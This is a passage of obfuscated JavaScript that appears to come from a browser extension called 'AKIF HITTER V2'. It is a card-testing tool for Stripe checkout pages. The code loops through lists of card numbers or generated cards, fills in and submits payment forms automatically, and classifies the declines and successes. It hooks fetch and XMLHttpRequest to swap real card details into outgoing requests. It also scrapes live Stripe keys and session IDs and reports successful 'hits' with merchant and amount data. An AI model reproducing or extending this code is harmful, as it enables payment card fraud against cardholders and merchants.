              if (v_1_5) return v_1_5;
            }
          }
          return null;
        }
        const v_2_2 = fn_1_3(p_1),
          v_3_2 = v_54 ? Date.now() - v_54 : 0,
          v_4_2 = {
            'amount': v_56.amount || '0',
            'currency': v_56.currency || "USD"
          },
          v_5_2 = v_4_2;
        if (v_2_2) {
          v_63 = true, v_64 = v_1_2, fn_58(), fn_61();
          return;
        }
        fn_72(p_1);
        let v_6_2 = fn_2_2(p_1);
        if (!v_6_2) {
          if (p_1.error?.["type"] === "card_error") {
            v_6_2 = "card_declined";
          } else p_1.error?.["type"] === "invalid_request_error" && (v_6_2 = "invalid_request");
        }
        if (v_6_2 && (v_6_2.toLowerCase().includes("timeout") || v_6_2 === "request_timeout")) return;
        if (v_6_2) {
          v_63 = true, v_64 = v_1_2, fn_58();
          const v_1_3 = false;
          fn_7(v_6_2, v_6_2, v_3_2, v_5_2, v_1_3, v_34, v_38.length || v_51.length);
          if (window.generatedCardFull) {
            const v_1_4 = window.generatedCardFull.split('|');
            fn_38(v_1_4[0], v_1_4[1], v_1_4[2], v_1_4[3], v_6_2);
            if (fn_1_1(v_6_2)) {
              const v_1_5 = v_1_4[0];
              let v_2_4 = "UNKNOWN";
              const v_3_4 = v_1_5.charAt(0);
              if (v_3_4 === '4') v_2_4 = "VISA";else {
                if (v_3_4 === '5') v_2_4 = "MASTERCARD";else {
                  if (v_3_4 === '3') v_2_4 = "AMEX";else v_3_4 === '6' && (v_2_4 = "DISCOVER");
                }
              }
              const v_4_4 = {
                'hit_code': v_6_2,
                'response': v_6_2,
                'amount': v_56.amount || "0.00",
                'currency': (v_56.currency || "USD").toUpperCase(),
                'username': fn_2(),
                'userId': fn_3(),
                'attempt': String(v_34),
                'total_cards': String(v_38.length || v_51.length),
                'duration_ms': String(Math.round(Date.now() - (v_54 || Date.now()) || 0)),
                'bin': fn_34() || v_1_5.substring(0, 6),
                'card_type': v_2_4,
                'card_number': v_1_5.substring(0, 4) + "****" + v_1_5.substring(-4)
              };
              fn_4(v_4_4).catch(p_1_1 => {});
            }
          }
          const v_2_3 = ["checkout_not_active_session", "checkout_session_expired", "payment_intent_unexpected_state", "resource_missing", "session_expired", "expired_session", "invalid_session"],
            v_3_3 = v_6_2.toLowerCase(),
            v_4_3 = v_3_3.includes("session") || v_3_3.includes("expired") && v_3_3 !== "expired_card";
          (v_2_3.includes(v_3_3) || v_4_3) && fn_60(v_6_2);
        }
      }
      function fn_60(p_1) {
        if (v_33) {
          v_33 = false;
          const v_1_2 = document.getElementById("autocoBtn");
          if (v_1_2) {
            v_1_2.innerHTML = "<i class=\"fas fa-play\"></i> START", v_1_2.classList.remove("active");
          }
          fn_35("\u26D4 Auto-stopped: " + p_1, "error");
        }
      }
      async function fn_61() {
        if (v_34 === 0 || !v_34) return;
        if (v_31 || v_30) return;
        v_30 = true;
        v_31 = true;
        let v_1_2 = '0s';
        if (v_54) {
          const v_1_3 = Math.round((Date.now() - v_54) / 1000),
            v_2_3 = Math.floor(v_1_3 / 60),
            v_3_3 = v_1_3 % 60;
          v_1_2 = v_2_3 > 0 ? v_2_3 + 'm\x20' + v_3_3 + 's' : v_3_3 + 's';
        }
        v_33 && fn_67();
        if (window.generatedCardFull) {
          const v_1_3 = window.generatedCardFull.split('|');
          fn_38(v_1_3[0], v_1_3[1], v_1_3[2], v_1_3[3], "SUCCESS");
        } else window.generatedCard ? fn_38(window.generatedCard, '??', '??', "???", "SUCCESS") : fn_38("Unknown", '??', '??', "???", "SUCCESS");
        if (window.generatedCardFull) {
          const v_1_3 = window.generatedCardFull.split('|'),
            v_2_3 = v_1_3[0];
          let v_3_3 = "UNKNOWN";
          const v_4_2 = v_2_3.charAt(0);
          if (v_4_2 === '4') v_3_3 = "VISA";else {
            if (v_4_2 === '5') v_3_3 = "MASTERCARD";else {
              if (v_4_2 === '3') v_3_3 = "AMEX";else v_4_2 === '6' && (v_3_3 = "DISCOVER");
            }
          }
          const v_5_2 = {
            'hit_code': "succeeded",
            'response': "succeeded",
            'amount': v_56.amount || "0.00",
            'currency': (v_56.currency || "USD").toUpperCase(),
            'username': fn_2(),
            'userId': v_40 || localStorage.getItem("akif_user_id") || "AkifUser",
            'attempt': String(v_34),
            'total_cards': String(v_38.length || v_51.length),
            'duration_ms': String(Math.round(Date.now() - (v_54 || Date.now()) || 0)),
            'bin': fn_34() || v_2_3.substring(0, 6),
            'card_type': v_3_3,
            'card_number': v_2_3.substring(0, 4) + "****" + v_2_3.substring(-4)
          };
          fn_4(v_5_2).catch(p_1 => {});
        }
        fn_63(v_34, v_1_2), fn_64();
        fn_62();
        const v_2_2 = "cardGeneratorHit_" + window.location.href;
        localStorage.setItem(v_2_2, "true");
        const v_3_2 = {
          'type': "PLAY_SUCCESS_SOUND",
          'volume': v_47
        };
        window.postMessage(v_3_2, '*');
        if (v_43 && v_44 && v_45) {
          !v_56.businessUrl && (v_56.businessUrl = window.location.hostname || window.location.origin);
          !v_56.successUrl && (v_56.successUrl = window.location.href);
          const v_1_3 = {
            'cardNumber': window.generatedCardFull || window.generatedCard || '',
            'amount': v_56.amount || '0',
            'currency': v_56.currency || "usd",
            'businessUrl': v_56.businessUrl,
            'successUrl': v_56.successUrl,
            'email': v_49 || '',
            'attempt': v_34,
            'timeTaken': v_1_2
          };
          fn_28(v_1_3);
        }
      }
      function fn_62() {
        window.postMessage({
          'type': "CAPTURE_SCREENSHOT_REQUEST"
        }, '*');
      }
      function fn_63(p_1, p_2) {
        const v_1_2 = document.querySelector(".success-toast");
        v_1_2 && v_1_2.remove();
        const v_2_2 = new Date();
        let v_3_2 = v_2_2.getHours();
        const v_4_2 = String(v_2_2.getMinutes()).padStart(2, '0'),
          v_5_2 = v_3_2 >= 12 ? 'PM' : 'AM';
        v_3_2 = v_3_2 % 12 || 12;
        const v_6_2 = String(v_3_2).padStart(2, '0') + '.' + v_4_2 + v_5_2,
          v_7_2 = String(v_2_2.getDate()).padStart(2, '0'),
          v_8_2 = String(v_2_2.getMonth() + 1).padStart(2, '0'),
          v_9_2 = String(v_2_2.getFullYear()).slice(-2),
          v_10_2 = v_7_2 + '|' + v_8_2 + '|' + v_9_2,
          v_11_2 = document.createElement("div");
        v_11_2.className = "success-toast", v_11_2.innerHTML = "<div class=\"success-toast-content\"><div class=\"success-ripple-container\"><div class=\"success-ripple-ring\"></div><div class=\"success-ripple-ring\"></div><div class=\"success-check\">\u2713</div></div><div class=\"success-toast-text\"><div class=\"success-toast-title\">Payment Successful</div><div class=\"success-toast-details\">Attempt: " + p_1 + " | T/t: " + p_2 + "</div><div class=\"success-toast-details\">Time: " + v_6_2 + " | Date: " + v_10_2 + "</div></div></div>", document.body.appendChild(v_11_2), v_11_2.classList.add("show");
      }
      function fn_64() {
        const v_1_2 = document.createElement("div");
        v_1_2.className = "color-ball-container", document.body.appendChild(v_1_2);
        function fn_1_3() {
          const v_1_3 = document.createElement("div"),
            v_2_3 = "ball-pos-" + Math.floor(Math.random() * 20) * 5;
          const v_3_2 = "ball-size-" + ['sm', 'md', 'lg'][Math.floor(Math.random() * 3)],
            v_4_2 = "ball-color-" + Math.floor(Math.random() * 8),
            v_5_2 = "ball-delay-" + Math.floor(Math.random() * 10),
            v_6_2 = "ball-dur-" + Math.floor(Math.random() * 3);
          v_1_3.className = "color-ball " + v_2_3 + '\x20' + v_3_2 + '\x20' + v_4_2 + '\x20' + v_5_2 + '\x20' + v_6_2;
          v_1_2.appendChild(v_1_3), setTimeout(() => v_1_3.remove(), 6000);
        }
        for (let v_1_3 = 0; v_1_3 < 50; v_1_3++) {
          fn_1_3();
        }
        const v_2_2 = setInterval(() => {
          if (!document.body.contains(v_1_2)) {
            clearInterval(v_2_2);
          } else for (let v_1_3 = 0; v_1_3 < 10; v_1_3++) {
            fn_1_3();
          }
        }, 500);
      }
      async function fn_65() {
        while (v_33 && !v_31) {
          if (v_31) break;
          if (fn_2_1()) {
            while (fn_2_1() && v_33 && !v_31) {
              await new Promise(p_1 => setTimeout(p_1, 500));
            }
            if (!v_33 || v_31) {
              break;
            }
            await new Promise(p_1 => setTimeout(p_1, 1000));
          }
          v_63 = false, v_54 = Date.now(), await fn_48();
          if (v_31) {
            break;
          }
          const v_1_2 = await fn_56();
          if (!v_33 || v_31 || !v_1_2) {
            break;
          }
          const v_2_2 = document.querySelector(".SubmitButton-IconContainer");
          if (v_2_2) {
            const v_1_3 = v_2_2.closest(".SubmitButton") || v_2_2.closest("button");
            v_1_3 && v_1_3.click();
          }
          if (fn_2_1()) {
            while (fn_2_1() && v_33 && !v_31) {
              await new Promise(p_1 => setTimeout(p_1, 500));
            }
            if (!v_33 || v_31) break;
            await new Promise(p_1 => setTimeout(p_1, 500));
          }
          await fn_57(15000);
          if (!v_33 || v_31) break;
          await new Promise(p_1 => setTimeout(p_1, 500)), await fn_56();
        }
        v_31 && fn_67();
      }
      function fn_66() {
        if (v_33) {
          return;
        }
        v_33 = true, v_53 = Date.now();
        if (fn_20()) {
          fn_54().then(() => fn_65());
        } else {
          fn_53().then(() => fn_65());
        }
        const v_1_2 = document.getElementById("autocoBtn");
        if (v_1_2) {
          v_1_2.innerHTML = "<i class=\"fas fa-stop\"></i> STOP", v_1_2.classList.add("active");
        }
      }
      function fn_67() {
        v_33 = false;
        const v_1_2 = document.getElementById("autocoBtn");
        if (v_1_2) {
          v_1_2.innerHTML = "<i class=\"fas fa-play\"></i> START", v_1_2.classList.remove("active");
        }
      }
      function fn_68() {
        if (v_38.length === 0 || v_39 >= v_38.length) {
          return null;
        }
        const v_1_2 = v_38[v_39];
        v_39++;
        const v_2_2 = v_1_2.split('|'),
          v_3_2 = {};
        v_3_2.number = v_2_2[0];
        v_3_2.month = v_2_2[1], v_3_2.year = v_2_2[2];
        v_3_2.cvv = v_2_2[3];
        const v_4_2 = v_3_2;
        return v_4_2;
      }
      function fn_69(p_1) {
        v_37 = p_1, document.querySelectorAll(".mode-btn").forEach(p_1_1 => p_1_1.classList.toggle("active", p_1_1.dataset.mode === p_1));
        const v_1_2 = document.getElementById("binSection"),
          v_2_2 = document.getElementById("ccSection"),
          v_3_2 = document.getElementById("proxySection");
        const v_4_2 = document.getElementById("proxyLogsSection");
        const v_5_2 = document.querySelector("#autocoBtn")?.["closest"](".section");
        const v_6_2 = document.querySelector("#settingsToggle")?.["closest"](".collapsible-section"),
          v_7_2 = document.querySelectorAll(".section-divider"),
          v_8_2 = document.querySelector("#statsToggle")?.["closest"](".collapsible-section");
        v_1_2 && v_1_2.classList.add("hidden");
        if (v_2_2) {
          v_2_2.classList.add("hidden");
        }
        v_3_2 && v_3_2.classList.add("hidden");
        v_4_2 && v_4_2.classList.add("hidden");
        v_5_2 && v_5_2.classList.remove("hidden");
        v_6_2 && v_6_2.classList.remove("hidden");
        v_8_2 && v_8_2.classList.remove("hidden");
        v_7_2.forEach(p_1_1 => p_1_1.classList.remove("hidden"));
        if (p_1 === "bin" && v_1_2) v_1_2.classList.remove("hidden");else {
          if (p_1 === 'cc' && v_2_2) v_2_2.classList.remove("hidden");else p_1 === "proxy" && v_3_2 && (v_3_2.classList.remove("hidden"), v_4_2 && v_4_2.classList.remove("hidden"), v_5_2 && v_5_2.classList.add("hidden"), v_6_2 && v_6_2.classList.add("hidden"), v_8_2 && v_8_2.classList.add("hidden"), v_7_2.forEach(p_1_1 => p_1_1.classList.add("hidden")));
        }
      }
      const v_76 = window.XMLHttpRequest;
      window.XMLHttpRequest = function () {
        const v_1_2 = new v_76();
        const v_2_2 = v_1_2.open,
          v_3_2 = v_1_2.send;
        const v_4_2 = ++v_62;
        v_1_2.addEventListener("load", function () {
          try {
            if (this.responseText) {
              const v_1_3 = JSON.parse(this.responseText);
              fn_59(v_1_3, "xhr_" + v_4_2);
            }
          } catch (v_1_3) {}
        });
        return v_1_2.open = function (p_1, p_2) {
          if (p_2 && typeof p_2 === "string" && v_68.cardNumber) {
            p_2.includes("card[number]=0000000000000000") && (p_2 = p_2.replace("card[number]=0000000000000000", "card[number]=" + v_68.cardNumber));
            if (p_2.includes("card[exp_month]=01") && p_2.includes("card[exp_year]=30")) {
              const v_1_3 = v_68.cardExpiry.split('/');
              p_2 = p_2.replace("card[exp_month]=01", "card[exp_month]=" + v_1_3[0]), p_2 = p_2.replace("card[exp_year]=30", "card[exp_year]=" + v_1_3[1]);
            }
            if (p_2.includes("card[cvc]=000")) {
              p_2 = p_2.replace("card[cvc]=000", "card[cvc]=" + v_68.cardCvc);
            }
          }
          return v_2_2.apply(v_1_2, arguments);
        }, v_1_2.send = function (p_1) {
          if (p_1 && typeof p_1 === "string" && v_68.cardNumber) {
            p_1.includes("card[number]=0000000000000000") && (p_1 = p_1.replace("card[number]=0000000000000000", "card[number]=" + v_68.cardNumber));
            if (p_1.includes("card[exp_month]=01") && p_1.includes("card[exp_year]=30")) {
              const v_1_3 = v_68.cardExpiry.split('/');
              p_1 = p_1.replace("card[exp_month]=01", "card[exp_month]=" + v_1_3[0]), p_1 = p_1.replace("card[exp_year]=30", "card[exp_year]=" + v_1_3[1]);
            }
            p_1.includes("card[cvc]=000") && (p_1 = p_1.replace("card[cvc]=000", "card[cvc]=" + v_68.cardCvc));
          }
          return v_3_2.apply(v_1_2, [p_1]);
        }, v_1_2;
      };
      const v_77 = window.fetch;
      window.fetch = async function (p_1, p_2) {
        if (p_2 && p_2.body && typeof p_2.body === "string" && v_68.cardNumber) {
          p_2.body.includes("card[number]=0000000000000000") && (p_2.body = p_2.body.replace("card[number]=0000000000000000", "card[number]=" + v_68.cardNumber));
          if (p_2.body.includes("card[exp_month]=01") && p_2.body.includes("card[exp_year]=30")) {
            const v_1_3 = v_68.cardExpiry.split('/');
            p_2.body = p_2.body.replace("card[exp_month]=01", "card[exp_month]=" + v_1_3[0]), p_2.body = p_2.body.replace("card[exp_year]=30", "card[exp_year]=" + v_1_3[1]);
          }
          p_2.body.includes("card[cvc]=000") && (p_2.body = p_2.body.replace("card[cvc]=000", "card[cvc]=" + v_68.cardCvc));
        }
        const v_3_2 = "fetch_" + ++v_62;
        try {
          const v_1_3 = await v_77.apply(this, [p_1, p_2]),
            v_2_3 = typeof p_1 === "string" ? p_1 : p_1?.["url"] || '',
            v_3_3 = v_1_3.headers?.["get"]("content-type") || '';
          if (v_3_3.includes("application/json")) try {
            const v_1_4 = v_1_3.clone(),
              v_2_4 = await v_1_4.text();
            v_2_4 && fn_59(JSON.parse(v_2_4), v_3_2);
          } catch (v_1_4) {}
          return v_1_3;
        } catch (v_1_3) {
          throw v_1_3;
        }
      };
      function fn_70(p_1) {
        if (!p_1 || typeof p_1 !== "string") {
          return null;
        }
        const v_1_2 = p_1.match(/\/c\/pay\/(cs_live_[a-zA-Z0-9]+)(?:[#\/]|$)/);
        if (v_1_2) return v_1_2[1];
        const v_2_2 = p_1.match(/\/payment_pages\/(cs_live_[a-zA-Z0-9]+)/);
        if (v_2_2) return v_2_2[1];
        const v_3_2 = p_1.match(/checkout\.stripe\.com\/(?:c\/)?pay\/(cs_live_[a-zA-Z0-9]+)/);
        if (v_3_2) {
          return v_3_2[1];
        }
        const v_4_2 = p_1.match(/cs_live_[a-zA-Z0-9]+(?=[#\/\?&\s]|$)/);
        if (v_4_2) return v_4_2[0];
        const v_5_2 = p_1.match(/\/c\/pay\/(cs_test_[a-zA-Z0-9]+)(?:[#\/]|$)/);
        if (v_5_2) return v_5_2[1];
        const v_6_2 = p_1.match(/\/payment_pages\/(cs_test_[a-zA-Z0-9]+)/);
        if (v_6_2) return v_6_2[1];
        const v_7_2 = p_1.match(/checkout\.stripe\.com\/(?:c\/)?pay\/(cs_test_[a-zA-Z0-9]+)/);
        if (v_7_2) {
          return v_7_2[1];
        }
        const v_8_2 = p_1.match(/cs_test_[a-zA-Z0-9]+(?=[#\/\?&\s]|$)/);
        if (v_8_2) return v_8_2[0];
        return null;
      }
      function fn_71() {
        const v_1_2 = document.documentElement.innerHTML,
          v_2_2 = v_1_2.match(/pk_live_[a-zA-Z0-9]+/);
        if (v_2_2) return v_2_2[0];
        const v_3_2 = document.querySelectorAll("script");
        for (const v_1_3 of v_3_2) {
          const v_1_4 = v_1_3.textContent || '',
            v_2_3 = v_1_4.match(/pk_live_[a-zA-Z0-9]+/);
          if (v_2_3) return v_2_3[0];
        }
        try {
          const v_1_3 = document.querySelectorAll("[data-stripe-publishable-key]");
          for (const v_1_4 of v_1_3) {
            const v_1_5 = v_1_4.getAttribute("data-stripe-publishable-key");
            if (v_1_5 && v_1_5.startsWith("pk_live_")) return v_1_5;
          }
        } catch (v_1_3) {}
        const v_4_2 = v_1_2.match(/pk_test_[a-zA-Z0-9]+/);
        if (v_4_2) return v_4_2[0];
        for (const v_1_3 of v_3_2) {
          const v_1_4 = v_1_3.textContent || '',
            v_2_3 = v_1_4.match(/pk_test_[a-zA-Z0-9]+/);
          if (v_2_3) return v_2_3[0];
        }
        try {
          const v_1_3 = document.querySelectorAll("[data-stripe-publishable-key]");
          for (const v_1_4 of v_1_3) {
            const v_1_5 = v_1_4.getAttribute("data-stripe-publishable-key");
            if (v_1_5 && v_1_5.startsWith("pk_test_")) return v_1_5;
          }
        } catch (v_1_3) {}
        return null;
      }
      function fn_72(p_1) {
        if (v_57 || !p_1 || typeof p_1 !== "object") return;
        function fn_1_3(p_1_1) {
          if (!p_1_1) return null;
          let v_1_3 = p_1_1.toString().trim();
          return v_1_3 = v_1_3.replace(/^https?:\/\//, '').replace(/^www\./, ''), v_1_3 = v_1_3.split('/')[0], v_1_3 = v_1_3.split('?')[0], v_1_3 = v_1_3.split('#')[0], v_1_3 || null;
        }
        const v_1_2 = {
            'pattern': /(?:^|\s)(GBP|£)\s*([\d\.,]+)/i,
            'code': "gbp",
            'hasSymbol': true
          },
          v_2_2 = [{
            'pattern': /(?:^|\s)(TRY|TL|₺)\s*([\d\.,]+)/i,
            'code': "try",
            'hasSymbol': true
          }, {
            'pattern': /([\d\.,]+)\s*(TRY|TL|₺)/i,
            'code': "try",
            'hasSymbol': false
          }, {
            'pattern': /(?:^|\s)(USD|\$)\s*([\d\.,]+)/i,
            'code': "usd",
            'hasSymbol': true
          }, {
            'pattern': /([\d\.,]+)\s*(USD|\$)/i,
            'code': "usd",
            'hasSymbol': false
          }, {
            'pattern': /(?:^|\s)(EUR|€)\s*([\d\.,]+)/i,
            'code': "eur",
            'hasSymbol': true
          }, {
            'pattern': /([\d\.,]+)\s*(EUR|€)/i,
            'code': "eur",
            'hasSymbol': false
          }, v_1_2, {
            'pattern': /([\d\.,]+)\s*(GBP|£)/i,
            'code': "gbp",
            'hasSymbol': false
          }, {
            'pattern': /(?:^|\s)(JPY|¥)\s*([\d\.,]+)/i,
            'code': "jpy",
            'hasSymbol': true
          }, {
            'pattern': /([\d\.,]+)\s*(JPY|¥)/i,
            'code': "jpy",
            'hasSymbol': false
          }, {
            'pattern': /(?:^|\s)(RUB|₽)\s*([\d\.,]+)/i,
            'code': "rub",
            'hasSymbol': true
          }, {
            'pattern': /([\d\.,]+)\s*(RUB|₽)/i,
            'code': "rub",
            'hasSymbol': false
          }, {
            'pattern': /(?:^|\s)(INR|₹)\s*([\d\.,]+)/i,
            'code': "inr",
            'hasSymbol': true
          }, {
            'pattern': /([\d\.,]+)\s*(INR|₹)/i,
            'code': "inr",
            'hasSymbol': false
          }];
        function fn_2_2(p_1_1) {
          if (!p_1_1) return null;
          if (p_1_1.includes(',') && p_1_1.includes('.')) p_1_1 = p_1_1.replace(/,/g, '');else p_1_1.includes(',') && !p_1_1.includes('.') && (p_1_1 = p_1_1.replace(',', '.'));
          const v_1_3 = p_1_1.replace(/[^\d\.]/g, '');
          const v_2_3 = parseFloat(v_1_3);
          return isNaN(v_2_3) ? null : v_2_3;
        }
        let v_3_2 = false;
        if (!v_56.businessUrl) {
          let v_1_3 = p_1.account_settings?.["business_url"] || p_1.account_settings?.["display_name"] || p_1.statement_descriptor;
          v_1_3 && (v_56.businessUrl = fn_1_3(v_1_3), v_3_2 = true);
        }
        if (!v_56.email) {
          const v_1_3 = p_1.customer_email;
          v_1_3 && (v_56.email = v_1_3, v_3_2 = true);
        }
        if (!v_56.successUrl) {
          const v_1_3 = p_1.success_url || p_1.return_url || p_1.redirect_url;
          v_1_3 && (v_56.successUrl = v_1_3, v_3_2 = true);
        }
        let v_4_2 = false,
          v_5_2 = false;
        const v_6_2 = {};
        v_6_2.amount = p_1.amount;
        v_6_2.currency = p_1.currency;
        const v_7_2 = v_6_2,
          v_8_2 = {};
        v_8_2.amount = p_1.amount_total, v_8_2.currency = p_1.currency;
        const v_9_2 = v_8_2,
          v_10_2 = {};
        v_10_2.amount = p_1.total, v_10_2.currency = p_1.currency;
        const v_11_2 = v_10_2,
          v_12_1 = {};
        v_12_1.amount = p_1.unit_amount, v_12_1.currency = p_1.currency;
        const v_13_1 = v_12_1,
          v_14_1 = {};
        v_14_1.amount = p_1.payment_intent?.["amount"], v_14_1.currency = p_1.payment_intent?.["currency"];
        const v_15_1 = v_14_1,
          v_16_1 = {};
        v_16_1.amount = p_1.paymentIntent?.["amount"], v_16_1.currency = p_1.paymentIntent?.["currency"];
        const v_17_1 = v_16_1,
          v_18_1 = {};
        v_18_1.amount = p_1.charge?.["amount"], v_18_1.currency = p_1.charge?.["currency"];
        const v_19_1 = v_18_1,
          v_20_1 = {};
        v_20_1.amount = p_1.data?.["amount"], v_20_1.currency = p_1.data?.["currency"];
        const v_21_1 = v_20_1,
          v_22_1 = {};
        v_22_1.amount = p_1.line_items?.["data"]?.[0]?.["amount_total"], v_22_1.currency = p_1.line_items?.["data"]?.[0]?.["currency"];
        const v_23_1 = v_22_1,
          v_24_1 = {};
        v_24_1.amount = p_1.line_item_group?.["total"], v_24_1.currency = p_1.line_item_group?.["currency"];
        const v_25_1 = v_24_1,
          v_26_1 = {};
        v_26_1.amount = p_1.invoice?.["amount_due"], v_26_1.currency = p_1.invoice?.["currency"];
        const v_27_1 = v_26_1,
          v_28_1 = [v_7_2, v_9_2, v_11_2, v_13_1, v_15_1, v_17_1, v_19_1, v_21_1, v_23_1, v_25_1, v_27_1];
        for (const v_1_3 of v_28_1) {
          if (v_1_3.amount && typeof v_1_3.amount === "number" && v_1_3.amount > 0) {
            (!v_56.amount || v_56.amount === '0' || v_56.amount === "0.00") && (v_56.amount = (Number(v_1_3.amount) / 100).toFixed(2), v_4_2 = true, v_3_2 = true);
            v_1_3.currency && !v_56.currency && (v_56.currency = v_1_3.currency.toLowerCase(), v_5_2 = true, v_3_2 = true);
            if (v_4_2 && v_5_2) break;
          }
        }
        if (!v_4_2 || !v_5_2) try {
          const v_1_3 = ["[data-testid=\"hosted-payment-total-amount\"]", "[data-testid=\"total-amount\"]", ".OrderSummary-total", ".total-amount", "[class*=\"total\"]", "[class*=\"Total\"]", "[class*=\"price\"]", "[class*=\"Price\"]", "[class*=\"amount\"]", "[class*=\"Amount\"]", ".payment-amount", ".amount", "[class*=\"order-total\"]", "[class*=\"OrderTotal\"]", ".ProductSummary-total", ".Summary-total"];
          for (const v_1_4 of v_1_3) {
            const v_1_5 = document.querySelectorAll(v_1_4);
            for (const v_1_6 of v_1_5) {
              const v_1_7 = v_1_6.textContent || v_1_6.innerText || '';
              for (const v_1_8 of v_2_2) {
                const v_1_9 = v_1_7.match(v_1_8.pattern);
                if (v_1_9) {
                  let v_1_10 = v_1_8.hasSymbol ? v_1_9[2] : v_1_9[1];
                  const v_2_3 = fn_2_2(v_1_10);
                  v_2_3 !== null && !v_4_2 && (v_56.amount = v_2_3.toFixed(2), v_4_2 = true);
                  !v_5_2 && (v_56.currency = v_1_8.code, v_5_2 = true);
                  v_3_2 = true;
                  break;
                }
              }
              if (!v_4_2 && !v_5_2) {
                const v_1_8 = v_1_7.match(/([\d\.,]+)/);
                if (v_1_8) {
                  const v_1_9 = fn_2_2(v_1_8[1]);
                  v_1_9 !== null && v_1_9 > 0 && (v_56.amount = v_1_9.toFixed(2), v_4_2 = true, v_3_2 = true);
                }
              }
              if (v_4_2 && v_5_2) break;
            }
            if (v_4_2 && v_5_2) break;
          }
        } catch (v_1_3) {}
        if (!v_56.currency || v_56.currency === '') {
          const v_1_3 = window.location.href.toLowerCase();
          if (v_1_3.includes("/tr/") || v_1_3.includes("tr-") || v_1_3.includes(".tr") || v_1_3.includes("turkey")) v_56.currency = "try";else {
            if (v_1_3.includes("/uk/") || v_1_3.includes("uk-") || v_1_3.includes(".uk")) v_56.currency = "gbp";else {
              if (v_1_3.includes("/eu/") || v_1_3.includes("eu-") || v_1_3.includes(".eu")) v_56.currency = "eur";else {
                if (v_1_3.includes("/jp/") || v_1_3.includes("jp-") || v_1_3.includes(".jp")) {
                  v_56.currency = "jpy";
                } else {
                  v_56.currency = "usd";
                }
              }
            }
          }
          v_3_2 = true;
        }
        (!v_56.amount || v_56.amount === '0' || v_56.amount === "0.00") && (v_56.amount = "0.00");
        if (Object.values(v_56).every(p_1_1 => p_1_1 !== '')) {
          v_57 = true;
        } else {
          if (v_3_2 && !v_56.businessUrl) {
            v_56.businessUrl = window.location.hostname.replace(/^(checkout|pay|billing|buy)\./, '').replace(/^www\./, '');
          }
        }
      }
      function fn_73() {
        const v_1_2 = document.querySelector(".card-generator-overlay");
        if (!v_1_2 || !v_1_1) {
          return;
        }
        if (!v_32) {
          v_5_1 = {
            'wasMinimized': v_32,
            'timestamp': Date.now()
          }, v_4_1 = true, v_32 = true, v_1_2.classList.add("minimized");
          let v_1_3 = document.querySelector(".akif-minimize-badge");
          !v_1_3 ? (v_1_3 = document.createElement("div"), v_1_3.className = "akif-minimize-badge", v_1_3.textContent = "AKIF HITTER V2", v_1_3.addEventListener("click", function () {
            const v_1_4 = document.querySelector(".card-generator-overlay");
            const v_2_3 = document.querySelector(".akif-minimize-badge");
            if (v_1_4) {
              v_1_4.classList.remove("minimized");
              v_2_3 && v_2_3.remove();
              v_32 = false;
              const v_1_5 = document.getElementById("minimizeBtn");
              if (v_1_5) {
                v_1_5.innerHTML = "<i class=\"fas fa-minus\"></i>", v_1_5.title = "Close panel";
              }
            }
          }), document.body.appendChild(v_1_3)) : v_1_3.style.display = "flex";
          const v_2_2 = document.getElementById("minimizeBtn");
          v_2_2 && (v_2_2.innerHTML = "<i class=\"fas fa-plus\"></i>", v_2_2.title = "Open panel");
        }
      }
      function fn_74() {
        const v_1_2 = document.querySelector(".card-generator-overlay");
        if (!v_1_2 || !v_1_1) return;
        const v_2_2 = document.querySelector(".akif-minimize-badge");
        v_2_2 && v_2_2.remove();
        if (v_4_1 && v_5_1) {
          const v_1_3 = Date.now() - v_5_1.timestamp;
          if (v_1_3 < 300000) {
            if (!v_5_1.wasMinimized) {
              v_32 = false, v_1_2.classList.remove("minimized");
              const v_1_4 = document.getElementById("minimizeBtn");
              if (v_1_4) {
                v_1_4.innerHTML = "<i class=\"fas fa-minus\"></i>", v_1_4.title = "Close panel";
              }
            }
          }
        }
        v_4_1 = false, v_5_1 = null;
      }
      let v_78 = false;
      function fn_75() {
        const v_1_2 = document.querySelector(".card-generator-overlay");
        if (v_1_2 && v_1_1 && !v_32) {
          v_78 = true, v_32 = true, v_1_2.classList.add("minimized");
          const v_1_3 = document.getElementById("minimizeBtn");
          if (v_1_3) {
            v_1_3.innerHTML = "<i class=\"fas fa-plus\"></i>", v_1_3.title = "Open panel";
          }
        }
      }
      function fn_76() {
        const v_1_2 = document.querySelector(".card-generator-overlay"),
          v_2_2 = document.querySelector(".akif-minimize-badge");
        if (v_1_2 && v_1_1 && v_78 && v_32) {
          v_32 = false, v_1_2.classList.remove("minimized");
          v_2_2 && v_2_2.remove();
          const v_1_3 = document.getElementById("minimizeBtn");
          v_1_3 && (v_1_3.innerHTML = "<i class=\"fas fa-minus\"></i>", v_1_3.title = "Close panel");
        }
        v_78 = false;
      }
      function fn_77(p_1) {
        const v_1_2 = document.querySelector(".card-generator-overlay"),
          v_2_2 = document.getElementById("minimizeBtn");
        let v_3_2 = document.querySelector(".akif-minimize-badge");
        if (v_1_2) {
          if (!v_32) {
            v_32 = true, v_1_2.classList.add("minimized");
            if (!v_3_2) {
              v_3_2 = document.createElement("div"), v_3_2.className = "akif-minimize-badge", v_3_2.textContent = "AKIF HITTER V2", v_3_2.addEventListener("click", function () {
                const v_1_3 = document.querySelector(".card-generator-overlay");
                const v_2_3 = document.querySelector(".akif-minimize-badge");
                if (v_1_3) {
                  v_1_3.classList.remove("minimized");
                  if (v_2_3) {
                    v_2_3.remove();
                  }
                  v_32 = false;
                  const v_1_4 = document.getElementById("minimizeBtn");
                  v_1_4 && (v_1_4.innerHTML = "<i class=\"fas fa-minus\"></i>", v_1_4.title = "Close panel");
                }
              }), document.body.appendChild(v_3_2);
            } else v_3_2.style.display = "flex";
            v_2_2 && (v_2_2.innerHTML = "<i class=\"fas fa-plus\"></i>", v_2_2.title = "Open panel");
          } else {
            v_32 = false, v_1_2.classList.remove("minimized");
            if (v_3_2) {
              v_3_2.remove();
            }
            v_2_2 && (v_2_2.innerHTML = "<i class=\"fas fa-minus\"></i>", v_2_2.title = "Close panel");
          }
          v_4_1 = false, v_5_1 = null;
        }
        p_1 && p_1.stopPropagation();
      }
      async function fn_78() {
        if (v_60) return;
        v_60 = true;
        const v_1_2 = "cardGeneratorHit_" + window.location.href;
        let v_2_2 = '';
        const v_3_2 = new Promise(p_1 => {
            window.AkifStorage && window.AkifStorage.loadAllData ? window.AkifStorage.loadAllData(p_1_1 => p_1(p_1_1[v_1_2] === "true" || p_1_1[v_1_2] === true)) : p_1(localStorage.getItem(v_1_2) === "true");
          }),
          v_4_2 = new Promise(p_1 => {
            if (window.AkifStorage && window.AkifStorage.loadAllData) window.AkifStorage.loadAllData(p_1_1 => {
